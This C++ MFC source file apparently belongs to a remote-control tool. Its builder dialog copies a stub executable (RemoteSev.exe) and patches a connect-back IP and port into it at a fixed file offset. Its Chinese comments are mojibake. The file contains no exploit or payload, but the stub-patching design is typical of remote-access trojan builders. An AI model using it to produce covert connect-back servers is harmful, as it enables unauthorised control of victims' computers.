// Build.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "RemoteClient.h"
#include "Build.h"
#include "sys.h"


// CBuild �Ի���

IMPLEMENT_DYNAMIC(CBuild, CDialog)

CBuild::CBuild(CWnd* pParent /*=NULL*/)
	: CDialog(CBuild::IDD, pParent)
	, m_IP(_T(""))
	, m_Port(6789)
{

}

CBuild::~CBuild()
{
}

void CBuild::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_IP, m_IP);
	DDX_Text(pDX, IDC_PORT, m_Port);
	DDV_MinMaxUInt(pDX, m_Port, 0, 65535);
}


BEGIN_MESSAGE_MAP(CBuild, CDialog)
	ON_BN_CLICKED(IDOK2, &CBuild::OnBnClickedOk2)
END_MESSAGE_MAP()


// CBuild ��Ϣ�������

BOOL CBuild::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	char cmpname[MAX_PATH] = {0};
	DWORD rs = 0;
	GetComputerNameA(cmpname, &rs);
	struct hostent *p = NULL;
	p = gethostbyname(cmpname);
	if (p == NULL)
	{
		return FALSE;
	}
	m_IP = inet_ntoa(*(IN_ADDR*)p->h_addr_list[0]);
	UpdateData(FALSE);
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

//���ɷ����
void CBuild::OnBnClickedOk2()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	UpdateData(TRUE);
	wchar_t temp[MAX_PATH] = {0};
	GetCurrentDirectory(MAX_PATH, temp);

	wchar_t DataPath[MAX_PATH] = {0};
	wchar_t BuildPath[MAX_PATH] = {0};

	wsprintfW(DataPath, _T("%s\\RemoteSevData"), temp);
	wsprintfW(BuildPath, _T("%s\\RemoteSev.exe"), temp);
	BOOL b = CopyFile(DataPath, BuildPath, FALSE);
	
	if (!b)
	{
		AfxMessageBox(_T("ȱ��DATA�ļ�"));
		return;
	}

	BUILD m_build;
	ZeroMemory(&m_build, sizeof(BUILD));
	wsprintfW(m_build.IP, _T("%s"), m_IP);
	m_build.port = m_Port;

	CFile file;
	if (file.Open(BuildPath, CFile::modeWrite))
	{
		file.Seek(0x97c50, CFile::begin);
		file.Write((void*)&m_build, sizeof(BUILD));
		file.Close();
		AfxMessageBox(_T("��������ɳɹ�!"));
	}
	
}
